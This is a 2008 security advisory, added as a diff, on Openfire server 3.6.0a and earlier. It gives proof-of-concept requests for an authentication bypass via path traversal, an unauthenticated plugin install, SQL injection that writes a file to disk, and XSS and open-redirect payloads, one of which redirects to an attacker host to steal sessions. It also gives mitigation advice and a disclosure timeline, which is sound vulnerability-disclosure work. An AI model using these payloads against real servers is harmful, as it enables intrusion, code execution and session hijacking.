@@ -1,0 +1,218 @@
+Advisory:               Openfire Server Multiple Vulnerabilities
+Advisory ID:            AKADV2008-001
+Release Date:           2008/11/07
+Revision:               1.0
+Last Modified:          2008/11/07
+Date Reported:          2008/05/17
+Author:                 Andreas Kurtz (mail at andreas-kurtz.de)
+Affected Software:      Openfire Server <= 3.6.0a
+Remotely Exploitable:   Yes
+Risk:                   Critical (x) High ( ) Medium ( ) Low ( )
+Vendor URL:             http://www.igniterealtime.org
+                        http://www.jivesoftware.com/
+Vendor Status:          No patch released yet.
+Patch development time: N/A
+
+
+Vulnerability description:
+--------------------------
+
+The jabber server Openfire (<= version 3.6.0a) contains several serious
+vulnerabilities. Depending on the particular runtime environment these
+issues can potentially even be used by an attacker to execute code
+on operating system level.
+
+1) Authentication bypass
+This vulnerability provides an attacker full access to all functions
+in the admin webinterface without providing any user credentials.
+The Tomcat filter which is responsible for authentication could be
+completely circumvented.
+
+2) SQL injection
+It is possible to pass SQL statements to the backend database through
+a SQL injection vulnerability. Depending on the particular
+runtime environment and database permissions it is even possible to
+write files to disk and execute code on operating system level.
+
+3) Multiple Cross-Site Scripting
+Permits arbitrary insertion of HTML- and JavaScript code in login.jsp.
+An attacker could also manipulate a parameter to specify
+a destination to which a user will be forwarded to after successful
+authentication.
+
+
+Technical details:
+------------------
+
+1) Authentication bypass
+Authentication to the openfire admin interface is secured by a filter in
+the Tomcat application server (org.jivesoftware.admin.AuthCheckFilter).
+This filter guarantees that access to the admin interface is only granted
+to authenticated users. Otherwise they get redirected to a login page.
+
+A design error in Openfire enables access to internal functions
+without the need for admin user credentials.
+The deployment descriptor (web.xml) configures some exclude values
+for the AuthCheckFilter:
+
+<filter>   
+  <filter-name>AuthCheck</filter-name>
+  <filter-class>org.jivesoftware.admin.AuthCheckFilter</filter-class>
+  <init-param>
+    <param-name>excludes</param-name>       
+    <param-value>login.jsp,index.jsp?logout=true,setup/index.jsp,
+            setup/setup-,.gif,.png,error-serverdown.jsp</param-value>
+  </init-param>
+</filter>
+
+When a request URL contains one of these Exclude-Strings the
+auth check mechanism is totally circumvented. This was considered
+necessary for the initial setup process or the presence plugin.
+Following POC demonstrates how an attacker could access
+internal functions by manipulating the URL providing one of these
+excludes(/setup/setup-/../../):
+
+http://www.foo.bar:9090/setup/setup-/../../log.jsp?log=info&mode=asc&lines=
+All
+
+2) SQL injection
+The parameter "type" in sipark-log-summary.jsp is prone to
+SQL injection. Untrusted user data enters the application in
+sipark-log-summary.jsp (line 163):
+
+    String type = ParamUtils.getParameter(request, "type");
+
+The function getCalls() in org.jivesoftware.openfire.sip.calllog.CallLogDAO
+processes this user input (SQLCondition) and constructs a SQL statement:
+
+    String sql = "SELECT * FROM sipPhoneLog";
+
+    sql = SQLCondition != null && !SQLCondition.equals("") ?
+          sql + " WHERE " + SQLCondition : sql;
+
+    sql += " ORDER BY datetime DESC";
+       
+That statement is executed in the method
+createScrollablePreparedStatement()
+in CallLogDAO (line 411):
+
+    return con.prepareStatement(sql);
+    
+In that case there is a SQL injection vulnerability present even though
+prepared statemens are used. This happens because the string sql is
+dynamically
+concatenated *before* it is passed to the prepared statement object.
+
+3) Cross-Site Scripting
+The parameter "url" in login.jsp was vulnerable to Cross-Site Scripting
+(XSS).
+This vulnerability is the only one which was fixed within the last 6
+months.
+
+http://www.foo.bar:9090/login.jsp?url="/><script>alert(document.cookie);</s
+cript>
+                       
+An attacker could also manipulate the parameter to specify a
+destination to which a user will be forwarded to after successful
+authentication:
+
+http://www.foo.bar:9090/login.jsp?url=http://www.attacker.com/StealSession
+
+If a user authenticates using that link it is easily possible for an
+attacker to hijack the users session.
+
+Furthermore the parameter "username" in login.jsp is still vulnerable
+to Cross-Site Scripting attacks.
+
+    
+Putting it all together:
+------------------------
+
+Since the SIP-Plugin is deactivated by default, an attacker needs to
+install it using the authentication bypass vulnerability and the
+following POST request:
+
+POST
+http://www.foo.bar:9090/setup/setup-/../../dwr/exec/downloader.installPlugi
+n.dwr HTTP/1.1
+Host: www.foo.bar:9090
+
+callCount=1
+c0-scriptName=downloader
+c0-methodName=installPlugin
+c0-id=7931_1210973487852
+c0-param0=string:http%3A%2F%2Fwww.igniterealtime.org%2Fprojects%2Fopenfire%
+2Fplugins%2Fsip.jar
+c0-param1=string:661780277
+xml=true
+
+After that activation the described SQL injection vulnerability can
+be used in a single unauthenticated request.
+The following proof of concept uses a mysql database:
+
+http://www.foo.bar:9090/setup/setup-/../../plugins/sip/sipark-log-summary.j
+sp?
+type=all'UNION%20SELECT%20'attack-code'%20INTO%20OUTFILE%20'/tmp/attack.sh'
+%20/*&startDate=Any&endDate=Any&submit=true&get=Search
+
+
+Solution:
+---------
+
+Since the vendor didn't release a patch within the last 6 months it is
+highly recommended to deactivate access to the entire admin interface.
+This can be achieved for example by blocking the according ports
+(tcp/9090 & tcp/9091 by default) with a firewall. Following communication
+to the admin interface can be done via SSL tunnels.
+
+For more details see: http://www.andreas-kurtz.de/archives/63
+
+
+History:
+--------
+
+  2008/05/17 - Vendor notified using sales@jivesoftware.com
+  2008/05/18 - Vendor notified using gaston@jivesoftware.com
+  2008/05/20 - Vendor response
+  2008/05/20 - Detailed vulnerability information sent to the vendor
+  2008/05/21 - Vendor confirms the vulnerability
+  2008/08/18 - Asked vendor for up to date information regarding the
+reported issues
+  2008/10/18 - Again asked vendor for up to date information regarding the
+reported issues
+  2008/10/31 - Informed vendor of planned advisory realease on 2008/11/05
+(no response)
+  2008/11/07 - Full technical details and recommended measures released to general public
+       
+
+Credits:
+--------
+
+  Vulnerability found and advisory written by Andreas Kurtz.
+
+
+References:
+-----------
+
+  http://www.andreas-kurtz.de/archives/63
+
+
+Changes:
+--------
+
+  Revision 0.1 - Initial draft release to the vendor
+  Revision 1.0 - Final version released to general public
+
+
+Disclaimer:
+-----------
+
+The information within this advisory may change without notice. Use
+of this information constitutes acceptance for use in an AS IS
+condition. There are no warranties, implied or express, with regard
+to this information. In no event shall the author be liable for any
+direct or indirect damages whatsoever arising out of or in connection
+with the use or spread of this information. Any use of this
+information is at the user's own risk.
+
+# milw0rm.com [2008-11-09]
